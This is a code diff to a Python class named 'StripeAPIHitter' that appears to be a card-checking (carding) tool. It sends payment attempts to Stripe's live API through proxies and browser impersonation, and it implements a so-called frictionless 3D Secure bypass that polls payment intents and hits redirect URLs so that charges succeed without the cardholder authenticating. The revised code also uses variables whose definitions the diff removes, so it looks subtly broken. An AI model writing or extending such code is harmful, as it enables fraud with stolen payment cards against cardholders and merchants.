@@ -734,17 +734,17 @@ class StripeAPIHitter:
                         result['success'] = True
                         return result
                     elif status == 'requires_action':
-                        # Frictionless 3DS API Bypass
                         try:
                             if next_action.get('type') == 'use_stripe_sdk':
                                 sdk = next_action.get('use_stripe_sdk', {})
-                                source_id = (
+                                source = (
                                     sdk.get('three_d_secure_2_source')
                                     or sdk.get('source')
                                     or next_action.get('source')
                                 )
-                                
-                                if source_id:
+                                state = None
+
+                                if source:
                                     auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                     auth_headers = {
                                         "accept": "application/json",
@@ -768,7 +768,7 @@ class StripeAPIHitter:
                                         "browserUserAgent": auth_headers["user-agent"]
                                     }
                                     auth_data = {
-                                        "source": source_id,
+                                        "source": source,
                                         "browser": json.dumps(browser),
                                         "one_click_authn_device_support[hosted]": "false",
                                         "one_click_authn_device_support[same_origin_frame]": "false",
@@ -777,93 +777,61 @@ class StripeAPIHitter:
                                         "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                         "key": self.pk_live
                                     }
-                                    
+
                                     auth_resp = await loop.run_in_executor(None, lambda: requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=30))
-                                    
                                 try:
                                     data = auth_resp.json()
                                     state = data.get("state")
-                                    print(f"DEBUG 3DS Auth Response: {data}", flush=True)
-                                except Exception as e:
+                                except Exception:
                                     state = "3DS Attempt failed"
-                                    print(f"DEBUG 3DS Auth Exception: {e}", flush=True)
-                                    
+
                                 if state == "challenge_required":
                                     result['decline_code'] = '3d_secure_required_hard'
                                     result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
                                     return result
 
-                                intent_id = pi.get('id') if isinstance(pi, dict) and pi.get('id') else (si.get('id') if isinstance(si, dict) else None)
-                                client_secret = pi.get('client_secret') if isinstance(pi, dict) and pi.get('client_secret') else (si.get('client_secret') if isinstance(si, dict) else None)
-                                
-                                if intent_id and client_secret:
-                                    if 'seti' in intent_id:
-                                        poll_url = f"https://api.stripe.com/v1/setup_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
-                                    else:
-                                        poll_url = f"https://api.stripe.com/v1/payment_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
-                                        
-                                    poll_headers = {
-                                        "accept": "application/json",
-                                        "origin": "https://js.stripe.com",
-                                        "referer": "https://js.stripe.com/"
-                                    }
-                                    
-                                    # Wait for Stripe's backend to process the frictionless auth before polling
-                                    await asyncio.sleep(2.5)
-                                    
-                                    poll_resp = await loop.run_in_executor(None, lambda: requests.get(poll_url, headers=poll_headers, proxies=proxies, timeout=30))
-                                    poll_json = poll_resp.json()
-                                    
-                                    status_2 = poll_json.get('status')
-                                    print(f"DEBUG Poll Status: {status_2}", flush=True)
-                                    if status_2 in ['succeeded', 'requires_capture', 'complete']:
-                                        result['success'] = True
-                                    else:
-                                        next_act_2 = poll_json.get('next_action') or {}
-                                        if status_2 == 'requires_action' and next_act_2.get('type') == 'redirect_to_url':
-                                            redirect_url = next_act_2.get('redirect_to_url', {}).get('url')
-                                            return_url = next_act_2.get('redirect_to_url', {}).get('return_url')
-                                            if redirect_url:
-                                                print(f"DEBUG: 3DS2 failed/unsupported. Falling back to 3DS1 redirect: {redirect_url}", flush=True)
-                                                # Attempt frictionless bypass by hitting the hooks URL with our impersonated browser
-                                                await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                                
-                                                # Poll the intent again to see if frictionless succeeded
-                                                poll_url_3 = f"https://api.stripe.com/v1/setup_intents/{intent_id}?key={self.pk_live}" if is_setup_intent else f"https://api.stripe.com/v1/payment_intents/{intent_id}?key={self.pk_live}"
-                                                poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                                poll_json_3 = poll_res_3.json()
-                                                poll_status_3 = poll_json_3.get('status')
-                                                
-                                                if poll_status_3 in ['succeeded', 'requires_capture', 'complete']:
-                                                    result['success'] = True
-                                                    result['final_url'] = return_url or redirect_url
-                                                    return result
-                                                    
-                                                result['decline_code'] = '3d_secure_required_hard'
-                                                result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
+                                poll_url = f"https://api.stripe.com/v1/payment_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
+                                poll_headers = {
+                                    "accept": "application/json",
+                                    "origin": "https://js.stripe.com",
+                                    "referer": "https://js.stripe.com/"
+                                }
+                                poll_resp = await loop.run_in_executor(None, lambda: requests.get(poll_url, headers=poll_headers, proxies=proxies, timeout=30))
+                                poll_json = poll_resp.json()
+                                status_2 = poll_json.get('status')
+                                if status_2 in ['succeeded', 'requires_capture', 'complete']:
+                                    result['success'] = True
+                                else:
+                                    next_act_2 = poll_json.get('next_action') or {}
+                                    if status_2 == 'requires_action' and next_act_2.get('type') == 'redirect_to_url':
+                                        redirect_url = next_act_2.get('redirect_to_url', {}).get('url')
+                                        return_url = next_act_2.get('redirect_to_url', {}).get('return_url')
+                                        if redirect_url:
+                                            await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                            
+                                            poll_url_3 = f"https://api.stripe.com/v1/payment_intents/{intent_id}?key={self.pk_live}"
+                                            poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                            poll_json_3 = poll_res_3.json()
+                                            poll_status_3 = poll_json_3.get('status')
+                                            
+                                            if poll_status_3 in ['succeeded', 'requires_capture', 'complete']:
+                                                result['success'] = True
                                                 result['final_url'] = return_url or redirect_url
                                                 return result
                                                 
-                                        err = poll_json.get('last_payment_error') or poll_json.get('last_setup_error') or poll_json.get('error') or {}
-                                        if status_2 == 'requires_action' and 'data' in locals():
-                                            if data.get('error'):
-                                                result['decline_code'] = "3d_bypass_not_supported"
-                                                result['error'] = f"Stripe rejected 3DS2 bypass: {data.get('error', {}).get('message')}. NEXT_ACTION: {str(next_action)}"
-                                            else:
-                                                result['decline_code'] = f"3d_debug_dict_{str(data)[:100]}"
-                                                result['error'] = 'Stuck in requires_action loop after bypass'
-                                        elif isinstance(err, dict):
-                                            result['decline_code'] = err.get('decline_code', err.get('code', status_2))
-                                            result['error'] = err.get('message', 'Unknown error')
-                                        else:
-                                            result['decline_code'] = status_2
-                                            result['error'] = 'Unknown error'
-                                    return result
-                                else:
-                                    result['decline_code'] = '3d_secure_auth_failed'
-                                    result['error'] = str(data)[:500] if 'data' in locals() else 'Missing intent context'
-                                    return result
-                                        
+                                            result['decline_code'] = '3d_secure_required_hard'
+                                            result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
+                                            result['final_url'] = return_url or redirect_url
+                                            return result
+
+                                    err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
+                                    if isinstance(err, dict):
+                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
+                                        result['error'] = err.get('message', 'Unknown error')
+                                    else:
+                                        result['decline_code'] = status_2
+                                        result['error'] = 'Unknown error'
+                                return result
                             elif next_action.get('type') == 'redirect_to_url':
                                 redirect_url = next_action.get('redirect_to_url', {}).get('url')
                                 return_url = next_action.get('redirect_to_url', {}).get('return_url')
